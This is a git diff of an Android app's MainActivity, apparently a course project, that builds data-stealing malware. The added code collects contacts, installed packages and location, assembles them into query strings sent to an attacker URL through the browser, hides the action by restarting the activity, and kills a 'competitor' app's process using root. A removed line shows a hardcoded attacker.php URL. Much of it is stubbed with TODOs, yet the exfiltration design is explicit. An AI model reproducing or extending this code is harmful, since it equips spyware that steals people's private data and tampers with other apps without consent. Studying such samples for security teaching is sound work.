@@ -1,16 +1,17 @@
 package com.trustme.testsu;
 
-import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Map;
+
+import com.trustme.testsu.root.Root;
+import com.trustme.testsu.utils.Constants;
+import com.trustme.testsu.utils.HelpFunctions;
 
 import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Bundle;
-import android.os.Message;
-import android.os.SystemClock;
 import android.app.Activity;
-import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageInfo;
@@ -25,7 +26,7 @@ public class MainActivity extends Activity {
 	public static final String TAG = "Main Activity";
 	public static final int START_IP_CHECK = 1;
 	public static final int STOP_IP_CHECK = 2;
-	public Context ctx;
+	public static Context ctx;
 	private SQLiteDatabase database;
 	
 	private ContactsDataSource datasource;
@@ -43,27 +44,53 @@ public class MainActivity extends Activity {
          getUserLocation();
          getInstalledApplications();
          getContacts();
+         getCompetitorsPid();
          prepareButtonCheckIp();
          prepareButtonStopCheckIp();
          prepareButtonExfiltrate();
     	
     }
     
-    @Override
+   
+
+	@Override
     public void onDestroy(){
     	datasource.close();
     	super.onDestroy();
     }
+    
+	@Override
+	public boolean onCreateOptionsMenu(Menu menu) {
+		getMenuInflater().inflate(R.menu.activity_main, menu);
+		return true;
+	}
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-    
+	/**
+	 * Finds the pid of a competitor
+	 * TODO: Run this on a background thread..whenever competitor gains focus kill it
+	 * @author sdemetr2
+	 */
+	 private void getCompetitorsPid() {
+			// TODO Auto-generated method stub
+		 int pid = HelpFunctions.getPidOfPack(Constants.COMPETITOR_PACK);
+		 Log.d(TAG, "PID of competitor is: " + pid);
+		 Root rt = new Root();
+		 rt.kill(pid);
+//		 String[] commands = {"kill" + pid};
+//		 rt.RunAsRoot(commands);
+	}
+	 
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+	
     /**
-     * @author sdemetr2
      * This function should fetch and try to exfiltrate 
      * 	all installed applications.
      * If there is no wifi store the data in the Database and
      * 	exfiltrate as soon as the wifi is back on.
      * Ideally it should perform this action in the background.
+     * @author sdemetr2
+     * 
      */
     private void getInstalledApplications() {
 		// TODO Auto-generated method stub
@@ -73,38 +100,32 @@ public class MainActivity extends Activity {
     	GetPackagesTask get_packages_task = new GetPackagesTask();
     	get_packages_task.execute();
 	}
-
-	
-	
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////	
     
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////
     /**
-     * @author sdemetr2
      * This function should fetch and and try to exfiltrate 
      * 	all user's contacts.
      * If there is no wifi store the data in the Database and
      * 	exfiltrate as soon as the wifi is back on.
      * Ideally it should perform this action in the background.
+     * @author sdemetr2
+     * 
      */
 	private void getContacts() {
 	
 		GetContactsTask get_contacts_task = new GetContactsTask();
 		get_contacts_task.execute();
-	}
-
-
-
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////    
+	}   
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////
 	/**
-	 * @author sdemetr2
+	 * 
      * This function should fetch and and try to exfiltrate 
      * 	the device's location.
      * If there is no wifi store the data in the Database and
      * 	exfiltrate as soon as the wifi is back on.
      * Ideally it should perform this action in the background.
+     * @author sdemetr2
      */
 	private void getUserLocation() {
 		// TODO Auto-generated method stub
@@ -141,10 +162,25 @@ public class MainActivity extends Activity {
 		});
 	}
     
+    private void prepareButtonExfiltrate() {
+		// TODO Auto-generated method stub
+    	btn_exfiltrate = (Button) findViewById(R.id.exfiltrate);
+    	
+    	btn_exfiltrate.setOnClickListener(new View.OnClickListener() {
+			
+			public void onClick(View v) {
+				// TODO Auto-generated method stub
+				exfiltrate(null,Constants.TEST_TRANSACTION);
+			}
+
+		});
+	}
+    
     /**
-     * @author sdemetr2
+     *
      * This function starts a service that checks periodically 
      *  if the device has an IP address and thus Internet access
+     *   @author sdemetr2
      */
     private void start_checking_for_ip() {
 		// TODO Auto-generated method stub
@@ -155,9 +191,10 @@ public class MainActivity extends Activity {
 	}
     
     /**
-     * @author sdemetr2
+     *
      * A call to this function should stop the service that checks periodically 
      *  if the device has an IP address and thus Internet access
+     *   @author sdemetr2
      */
 	protected void stop_checking_for_ip() {
 		// TODO Auto-generated method stub
@@ -167,31 +204,24 @@ public class MainActivity extends Activity {
 		intent.putExtra("CMD", STOP_IP_CHECK);
 		stopService(intent);
 	}
-
-	private void prepareButtonExfiltrate() {
-		// TODO Auto-generated method stub
-    	btn_exfiltrate = (Button) findViewById(R.id.exfiltrate);
-    	
-    	btn_exfiltrate.setOnClickListener(new View.OnClickListener() {
-			
-			public void onClick(View v) {
-				// TODO Auto-generated method stub
-				exfiltrate();
-			}
-
-		});
-	}
-	
-	
 	
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////
+	
 	/**
-	 * @author sdemetr2
+	 * 
      * This function will attempt to send the data to the url
      * 	using the browser
+     * Tip: Make different exfiltrate function to exfiltrate COntacts and installed packages and location
+     * Tip: Pass arguments to exfiltrate as key,value pairs (map) - easier to construct the URL
+     * @author sdemetr2
+     * @param data a Map<String, String> of key-value pairs representing the data to be transfered
+	 * @param id A unique ID that the server uses to acknowledge this transaction
+	 * 
      */
-    private void exfiltrate() {
+    private void exfiltrate(Map<String, String> data, String id) {
 		// TODO Auto-generated method stub
+    	String url = Constants.ATTACKER_URL;
+    	
     	this.runOnUiThread(new Runnable(){
             public void run(){
                 try {
@@ -199,28 +229,30 @@ public class MainActivity extends Activity {
                     restartTask.execute();
                 }
                 catch (Exception e) {
-                    Log.d("MyPlugin", "Exploded when trying to start background task: " + e.getMessage());
+                    Log.d(TAG, "Exfiltrate Exploded when trying to start background task: " + e.getMessage());
                 }
             }
         });
         
-        Intent myIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("http://soterisdemetriou.com/cs423/project/attacker.php?id=198462034867"));
+    	//construct url?key=value&key=value...
+    	url += "?id" + id;
+    	if (data != null){
+	    	for (String key : data.keySet()){
+	    		url += "&" + key + "=" + data.get(key);
+	    	}
+	    	Log.i(TAG, "Constructed URL: " + url);
+    	}
+        Intent myIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
     	startActivity(myIntent);
 	}
     
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////
-    
-	@Override
-    public boolean onCreateOptionsMenu(Menu menu) {
-        getMenuInflater().inflate(R.menu.activity_main, menu);
-        return true;
-    }
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////
 	
 	/**
-	 * @author sdemetr2
+	 * 
      * A background task that starts an Activity which will Restart the main Activity
      * Useful for hiding an operation that was triggered by the main activity  
+     * @author sdemetr2
      */
     public class RestartTask extends AsyncTask<Void, Void, Void>{
     	protected RestartTask() { }
@@ -257,11 +289,10 @@ public class MainActivity extends Activity {
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////
 	/**
 	 * 
-	 * @author sdemetr2
-	 * 
 	 * Background Task for fetching user's contacts.
 	 * It should try to exfiltrate them if there is Internet available or store them
 	 *	in the Db and start the IP checker
+	 *@author sdemetr2
 	 */
 	public class GetContactsTask extends AsyncTask<Void, Void, Void>{
 		protected GetContactsTask() { }
@@ -288,7 +319,7 @@ public class MainActivity extends Activity {
 		}
 	
 		private void getAndSaveContacts() {
-			// TODO Auto-generated method stub
+			// TODO try to exfiltrate them if there is Internet available or store them in the Db and start the IP checker          
 	
 			 database.execSQL("insert into " + DatabaseOpenHelper.DATABASE_TABLE_NAME + " (name,surname,phone)" + "values(\"soteris\",\"demetriou\","
 			                 + "\"102853471\") ;");
@@ -301,11 +332,10 @@ public class MainActivity extends Activity {
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////
 	/**
 	 * 
-	 * @author sdemetr2
-	 * 
 	 * Background Task that will fetch the installed packages on the device.
 	 * It will try to exfiltrate them if there is Internet or 
 	 * store them in the DB and start the IP checker
+	 * @author sdemetr2
 	 *
 	 */
 	public class GetPackagesTask extends AsyncTask<Void, Void, Void>{
@@ -337,6 +367,7 @@ public class MainActivity extends Activity {
 		 * @return an ArrayList with the installed Applications as PInfo objects
 		 */
 		private ArrayList<PInfo> getPackages() {
+			// TODO try to exfiltrate them if there is Internet available or store them in the Db and start the IP checker 
 		    ArrayList<PInfo> apps = getInstalledApps(false); /* false = no system packages */
 		    final int max = apps.size();
 		    for (int i=0; i<max; i++) {
